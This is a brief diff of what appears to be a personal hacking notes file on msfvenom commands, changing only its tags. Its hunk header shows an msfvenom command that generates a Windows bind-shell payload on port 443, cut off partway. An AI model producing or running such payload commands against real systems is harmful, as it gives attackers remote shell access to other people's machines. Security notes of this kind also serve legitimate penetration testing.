@@ -8,4 +8,4 @@ msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted
+    #assorted #command
